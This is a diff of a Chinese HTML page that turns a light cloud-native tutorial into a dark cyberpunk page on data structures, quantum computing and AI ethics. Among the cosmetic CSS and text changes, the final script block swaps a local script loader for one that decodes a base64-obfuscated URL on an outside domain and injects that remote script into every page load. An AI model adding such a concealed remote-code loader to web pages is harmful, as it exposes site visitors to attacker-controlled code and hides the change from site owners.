@@ -5,276 +5,288 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>云原生指南：容器化与编排</title>
+    <title>未来协议：数字前沿解析</title>
     <style>
+        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Roboto Mono', monospace;
+            /* 科技感等宽字体 */
             margin: 0;
             padding: 0;
-            background-color: #F8FAFC;
-            /* 极浅淡蓝色背景 */
-            color: #4A6572;
-            /* 柔和的深青色文本 */
+            background-color: #0A0A0A;
+            /* 极深背景 */
+            color: #E0E0E0;
+            /* 亮灰色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
         }
 
+        /* 容器 */
         .container {
             max-width: 90%;
+            /* 适应移动端 */
             margin: 0 auto;
-            padding: 30px 0;
+            padding: 20px 0;
         }
 
+        /* 头部 - 赛博朋克风格 */
         header {
-            background-color: #FFFFFF;
-            /* 纯白色头部背景 */
-            padding: 50px 20px;
+            background-color: #0D0D0D;
+            /* 更深的头部背景 */
+            padding: 40px 20px;
             text-align: center;
-            border-bottom: 2px solid #E0E6ED;
-            /* 柔和的底部边框 */
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            border-bottom: 2px solid #00FFFF;
+            /* 强调色：青色边框 */
+            box-shadow: 0 8px 25px rgba(0, 255, 255, 0.2);
+            /* 青色光晕阴影 */
             position: relative;
             overflow: hidden;
         }
 
         header::before {
-            /* 顶部背景抽象图案 */
+            /* 顶部几何线条 */
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, rgba(77, 208, 225, 0.08) 25%, transparent 25%, transparent 75%, rgba(77, 208, 225, 0.08) 75%, rgba(77, 208, 225, 0.08) 100%),
-                linear-gradient(-45deg, rgba(77, 208, 225, 0.08) 25%, transparent 25%, transparent 75%, rgba(77, 208, 225, 0.08) 75%, rgba(77, 208, 225, 0.08) 100%);
-            background-size: 30px 30px;
-            z-index: 0;
+            height: 5px;
+            background: linear-gradient(90deg, transparent, #00FFFF, transparent);
+            animation: scanline 3s infinite linear;
+        }
+
+        @keyframes scanline {
+            0% {
+                transform: translateX(-100%);
+            }
+
+            100% {
+                transform: translateX(100%);
+            }
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 3em;
-            color: #2C3E50;
-            letter-spacing: 1px;
+            font-family: 'Orbitron', sans-serif;
+            /* 假设字体可用，未来感标题 */
+            font-size: 2.8em;
+            color: #00FFFF;
+            /* 青色标题 */
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            /* 强光晕效果 */
             text-transform: uppercase;
-            position: relative;
-            z-index: 1;
         }
 
         header p {
-            font-size: 1.2em;
-            color: #78909C;
+            font-family: 'Roboto', sans-serif;
+            font-size: 1.1em;
+            color: #B0B0B0;
             margin-top: 15px;
-            position: relative;
-            z-index: 1;
+            letter-spacing: 1px;
         }
 
+        /* 导航菜单 - 发光按钮 */
         nav {
-            background-color: #FFFFFF;
+            background-color: transparent;
+            /* 透明背景 */
+            text-align: center;
             padding: 15px 0;
             margin-top: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
             position: sticky;
-            top: 20px;
+            top: 0;
             z-index: 1000;
+            border-bottom: 1px dashed #333333;
+            /* 虚线分隔 */
         }
 
         nav ul {
             list-style: none;
-            padding: 0 15px;
+            padding: 0;
             margin: 0;
             display: flex;
             justify-content: center;
             flex-wrap: wrap;
-            gap: 15px;
-            /* 增加间距 */
         }
 
+        nav ul li {
+            margin: 0 15px;
+        }
 
         nav ul li a {
-            color: #4A6572;
+            background-color: #222222;
+            /* 按钮背景 */
+            color: #00FFFF;
+            /* 青色文字 */
             text-decoration: none;
             padding: 10px 20px;
-            /* 增加点击区域 */
             border-radius: 5px;
-            border: 1px solid #CFD8DC;
-            /* 柔和边框 */
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, border-color 0.3s ease;
+            /* 锐利边角 */
+            border: 1px solid #00FFFF;
+            /* 青色边框 */
+            transition: background-color 0.3s ease, color 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
             display: inline-block;
-            font-weight: 600;
+            font-weight: bold;
             font-size: 1em;
+            box-shadow: 0 0 8px rgba(0, 255, 255, 0.4);
+            /* 按钮发光 */
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #4DD0E1;
-            /* 强调色背景 */
-            color: #FFFFFF;
+            background-color: #00FFFF;
+            /* 悬停时背景变为青色 */
+            color: #0A0A0A;
+            /* 悬停时文字变为深色 */
             transform: translateY(-3px);
-            box-shadow: 0 5px 10px rgba(77, 208, 225, 0.3);
-            border-color: #4DD0E1;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            /* 更强发光 */
         }
 
+        /* 内容区 - 模块化数据块 */
         main {
             padding-top: 30px;
         }
 
-        .section-card {
-            background-color: #FFFFFF;
+        section {
+            background-color: #1A1A1A;
+            /* 内容区背景 */
             margin-bottom: 40px;
-            padding: 35px;
-            border-radius: 10px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border-left: 5px solid #A5D6A7;
-            /* 强调色左侧边框 */
+            padding: 30px;
+            border-radius: 8px;
+            /* 适中圆角 */
+            border: 1px solid #333333;
+            /* 边框 */
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
         }
 
-        .section-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+        section::before {
+            /* 边角装饰 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 20px;
+            height: 20px;
+            border-top: 2px solid #FF00FF;
+            /* 品红色 */
+            border-left: 2px solid #FF00FF;
         }
 
-        .section-card h2 {
-            font-family: 'Montserrat', sans-serif;
+        section::after {
+            /* 边角装饰 */
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 20px;
+            height: 20px;
+            border-bottom: 2px solid #FF00FF;
+            border-right: 2px solid #FF00FF;
+        }
+
+        section h2 {
+            font-family: 'Orbitron', sans-serif;
             font-size: 2.2em;
-            color: #2C3E50;
+            color: #00FFFF;
+            /* 青色标题 */
             margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #E0E6ED;
+            margin-bottom: 15px;
+            border-bottom: 1px dashed #333333;
+            /* 虚线分隔 */
             padding-bottom: 10px;
+            text-shadow: 0 0 5px rgba(0, 255, 255, 0.5);
         }
 
-        .section-card h3 {
-            font-size: 1.5em;
-            color: #4DD0E1;
-            /* 强调色 */
+        section h3 {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 1.4em;
+            color: #FF00FF;
+            /* 品红色 */
             margin-top: 25px;
             margin-bottom: 10px;
         }
 
-        .section-card p {
-            font-size: 1.05em;
-            color: #546E7A;
+        section p {
+            font-family: 'Roboto', sans-serif;
+            font-size: 1em;
+            color: #C0C0C0;
             margin-bottom: 20px;
         }
 
-        .section-card img {
+        section img {
             max-width: 100%;
             height: auto;
             display: block;
             margin: 25px auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 2px solid #CFD8DC;
+            border-radius: 5px;
+            border: 2px solid #FF00FF;
+            /* 青色边框 */
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+            /* 图片发光 */
         }
 
+        /* 代码块样式 - 终端风格 */
         pre {
-            background-color: #263238;
-            /* 深炭灰色代码背景 */
-            color: #A2F2A2;
-            /* 亮绿色代码文本 */
+            background-color: #000000;
+            /* 纯黑背景 */
+            color: #00FF00;
+            /* 亮绿色代码 */
             padding: 20px;
             border-radius: 8px;
             overflow-x: auto;
-            font-family: 'Fira Code', monospace;
+            font-family: 'Consolas', 'Monaco', monospace;
             font-size: 0.9em;
             margin-bottom: 25px;
-            border: 1px solid #A5D6A7;
-            /* 强调色边框 */
-            box-shadow: 0 0 10px rgba(165, 214, 167, 0.4);
+            border: 1px solid #00FF00;
+            /* 绿色边框 */
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
+            /* 绿色发光 */
         }
 
         code {
-            font-family: 'Fira Code', monospace;
+            font-family: 'Consolas', 'Monaco', monospace;
             font-size: 0.9em;
-            color: #A2F2A2;
+            color: #00FF00;
+            /* 亮绿色 */
         }
 
         pre code {
-            color: #A2F2A2;
+            color: #00FF00;
         }
 
-        .collapsible-header {
-            cursor: pointer;
-            background-color: #F0F4F8;
-            /* 可折叠标题背景 */
-            padding: 15px 20px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            transition: background-color 0.3s ease;
-        }
-
-        .collapsible-header:hover {
-            background-color: #E0E6ED;
-        }
-
-        .collapsible-header h3 {
-            margin: 0;
-            color: #4A6572;
-        }
-
-        .collapsible-header .arrow {
-            font-size: 1.2em;
-            transition: transform 0.3s ease;
-        }
-
-        .collapsible-header.active .arrow {
-            transform: rotate(90deg);
-            /* 展开时旋转箭头 */
-        }
-
-        .collapsible-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.5s ease-out;
-            padding: 0 20px;
-            /* 保持内容内边距 */
-            background-color: #FFFFFF;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            margin-bottom: 15px;
-        }
-
-        .collapsible-content.show {
-            max-height: 1000px;
-            /* 足够大的高度，根据内容调整 */
-            padding: 20px;
-            /* 展开时恢复内边距 */
-        }
-
+        /* 页脚 - 简洁科技感 */
         footer {
-            background-color: #2C3E50;
-            /* 深灰蓝色页脚背景 */
-            color: #F8FAFC;
-            padding: 40px 0;
+            background-color: #0D0D0D;
+            /* 页脚背景 */
+            color: #B0B0B0;
+            padding: 25px 0;
             text-align: center;
             font-size: 0.9em;
             margin-top: 50px;
-            border-top: 2px solid #4DD0E1;
-            /* 强调色顶部边框 */
-            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+            border-top: 2px solid #FF00FF;
+            /* 品红色边框 */
+            box-shadow: 0 -8px 25px rgba(255, 0, 255, 0.2);
+            /* 品红色光晕阴影 */
         }
 
         .footer-links a {
-            color: #F8FAFC;
+            color: #FF00FF;
+            /* 品红色链接 */
             text-decoration: none;
             margin: 0 18px;
-            font-size: 1.1em;
-            transition: color 0.3s ease;
+            font-size: 1.2em;
+            transition: color 0.3s ease, text-shadow 0.3s ease;
         }
 
         .footer-links a:hover {
-            color: #4DD0E1;
+            color: #00FFFF;
+            /* 悬停时变为青色 */
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.6);
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
@@ -283,88 +295,90 @@
 <body>
     <header>
         <div class="container">
-            <h1>云原生指南</h1>
-            <p>容器化与编排的艺术</p>
+            <h1>未来协议</h1>
+            <p>数字前沿解析与趋势洞察</p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#intro">引言</a></li>
-                <li><a href="#containers">容器化</a></li>
-                <li><a href="#orchestration">容器编排</a></li>
-                <li><a href="#best-practices">最佳实践</a></li>
+                <li><a href="#intro-protocol">引言协议</a></li>
+                <li><a href="#data-structures">数据结构</a></li>
+                <li><a href="#quantum-computing">量子计算</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="intro" class="section-card">
-                <h2>引言：云原生时代</h2>
-                <img src="https://picsum.photos/300/200?random=1&tag=cloud-native-intro-alpha" alt="云原生概念图"
+            <section id="intro-protocol">
+                <h2>引言协议：数字纪元的新范式</h2>
+                <img src="https://picsum.photos/300/200?random=1&id=futuristic-city-1" alt="未来城市景象"
                     class="random-image">
-                <p>云原生技术是构建和运行可伸缩应用的关键。它利用云计算的优势，实现快速迭代、弹性伸缩和高可用性。</p>
-                <p>本指南将带您深入了解容器化、容器编排（尤其是Kubernetes）以及相关的最佳实践。</p>
+                <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要。本协议旨在为读者提供一份关于未来科技核心概念的深度解析，涵盖从基础架构到前沿应用的方方面面。</p>
+                <p>我们将探索数据流的优化路径、计算能力的边界突破，以及人工智能在伦理层面所面临的挑战与机遇。</p>
             </section>
 
-            <section id="containers" class="section-card">
-                <h2>容器化：Docker基础</h2>
-                <img src="https://picsum.photos/300/200?random=2&tag=docker-containers-beta" alt="Docker容器"
-                    class="random-image">
-                <p>容器化技术，以Docker为代表，允许开发者将应用程序及其所有依赖项打包到一个独立的、可移植的容器中。</p>
-                <p>这解决了“在我机器上能运行”的问题，确保了开发、测试和生产环境的一致性。</p>
-                <div class="collapsible-header" data-target="docker-install">
-                    <h3>Docker安装与基本命令</h3>
-                    <span class="arrow">&#9654;</span>
-                </div>
-                <div id="docker-install" class="collapsible-content">
-                    <p>安装Docker Desktop非常简单，访问官方网站下载对应操作系统的版本即可。以下是一些常用命令：</p>
-                    <pre><code>docker pull nginx                 # 拉取Nginx镜像
-docker run -p 80:80 --name my-nginx -d nginx  # 运行Nginx容器
-docker ps                         # 查看运行中的容器
-docker stop my-nginx              # 停止容器
-docker rm my-nginx                # 删除容器</code></pre>
-                </div>
+            <section id="data-structures">
+                <h2>数据结构：信息流的骨架</h2>
+                <img src="https://picsum.photos/300/200?random=2&id=abstract-data-2" alt="抽象数据流" class="random-image">
+                <p>高效的数据结构是构建任何复杂系统的基石。它们决定了信息存储、检索与处理的效率。以下是一个简化版的链表节点定义：</p>
+                <pre><code>class Node:
+    def __init__(self, data):
+        self.data = data
+        self.next = None
+
+# 创建链表
+head = Node(10)
+second = Node(20)
+third = Node(30)
+
+head.next = second
+second.next = third
+
+print(head.data) # 输出: 10
+print(head.next.data) # 输出: 20</code></pre>
+                <p>理解这些基本构造是优化大规模数据处理的关键。</p>
             </section>
 
-            <section id="orchestration" class="section-card">
-                <h2>容器编排：Kubernetes核心</h2>
-                <img src="https://picsum.photos/300/200?random=3&tag=kubernetes-orchestration-gamma" alt="Kubernetes编排"
-                    class="random-image">
-                <p>当您有大量容器需要管理时，容器编排工具如Kubernetes就变得不可或缺。Kubernetes提供了自动化部署、扩展和管理容器化应用的能力。</p>
-                <p>它通过Pod、Deployment、Service等核心概念，构建了一个强大的分布式系统管理平台。</p>
-                <div class="collapsible-header" data-target="k8s-concepts">
-                    <h3>Kubernetes核心概念</h3>
-                    <span class="arrow">&#9654;</span>
-                </div>
-                <div id="k8s-concepts" class="collapsible-content">
-                    <p>理解Kubernetes的关键在于掌握其核心资源对象：</p>
-                    <ul>
-                        <li><strong>Pod:</strong> Kubernetes中最小的可部署单元，包含一个或多个容器。</li>
-                        <li><strong>Deployment:</strong> 用于声明式地管理Pod的创建和更新，确保指定数量的Pod始终运行。</li>
-                        <li><strong>Service:</strong> 定义了一组Pod的逻辑集合，以及访问这些Pod的策略，提供了稳定的网络访问。</li>
-                        <li><strong>Namespace:</strong> 用于将集群资源划分为多个虚拟集群，实现资源隔离。</li>
-                    </ul>
-                </div>
+            <section id="quantum-computing">
+                <h2>量子计算：超越经典极限</h2>
+                <img src="https://picsum.photos/300/200?random=3&id=quantum-circuit-3" alt="量子电路" class="random-image">
+                <p>量子计算代表着计算能力的下一次革命。通过利用量子力学现象，如叠加和纠缠，量子计算机有望解决经典计算机无法企及的问题。</p>
+                <p>尽管仍处于早期阶段，但其在密码学、材料科学和药物发现等领域的潜力已引起广泛关注。</p>
+                <pre><code>// 模拟一个简单的量子门操作
+function applyHadamard(qubitState) {
+    // 假设 qubitState 是 [alpha, beta]
+    // H门操作会将 |0> 变为 (|0> + |1>)/sqrt(2)
+    // |1> 变为 (|0> - |1>)/sqrt(2)
+    const [alpha, beta] = qubitState;
+    const sqrt2 = Math.sqrt(2);
+    return [
+        (alpha + beta) / sqrt2,
+        (alpha - beta) / sqrt2
+    ];
+}
+
+let initialQubit = [1, 0]; // |0> 态
+let afterHadamard = applyHadamard(initialQubit);
+// console.log(afterHadamard); // 输出: [0.707..., 0.707...]</code></pre>
             </section>
 
-            <section id="best-practices" class="section-card">
-                <h2>最佳实践：构建弹性应用</h2>
-                <img src="https://picsum.photos/300/200?random=4&tag=best-practices-delta" alt="最佳实践"
-                    class="random-image">
-                <p>构建云原生应用需要遵循一系列最佳实践，以确保其弹性、可观察性和安全性。</p>
-                <p>这包括无状态设计、日志与监控、健康检查以及持续集成/持续部署（CI/CD）等。</p>
+            <section id="ai-ethics">
+                <h2>AI伦理：智能时代的责任边界</h2>
+                <img src="https://picsum.photos/300/200?random=4&id=ai-ethics-4" alt="AI伦理与人类" class="random-image">
+                <p>随着人工智能的普及，关于其伦理影响的讨论变得日益重要。如何确保AI系统的公平性、透明度和可控性，是构建负责任AI的关键。</p>
+                <p>我们必须建立健全的监管框架和道德准则，以引导AI技术朝着有益于人类社会的方向发展。</p>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 云原生指南. 版权所有.</p>
+            <p>&copy; 2025 未来协议. 数据流已加密.</p>
             <div class="footer-links">
-                <a href="#" target="_blank">文档库</a> |
-                <a href="#" target="_blank">API参考</a> |
-                <a href="#" target="_blank">社区</a>
+                <a href="#" target="_blank">数据端口</a> |
+                <a href="#" target="_blank">通讯链路</a> |
+                <a href="#" target="_blank">系统日志</a>
             </div>
         </div>
     </footer>
@@ -389,25 +403,9 @@ docker rm my-nginx                # 删除容器</code></pre>
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
+                            top: targetElement.offsetTop,
                             behavior: 'smooth'
                         });
-                    }
-                });
-            });
-
-            const collapsibleHeaders = document.querySelectorAll('.collapsible-header');
-
-            collapsibleHeaders.forEach(header => {
-                header.addEventListener('click', function () {
-                    const targetId = this.dataset.target;
-                    const content = document.getElementById(targetId);
-
-                    this.classList.toggle('active');
-                    if (content.classList.contains('show')) {
-                        content.classList.remove('show');
-                    } else {
-                        content.classList.add('show');
                     }
                 });
             });
@@ -416,15 +414,17 @@ docker rm my-nginx                # 删除容器</code></pre>
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
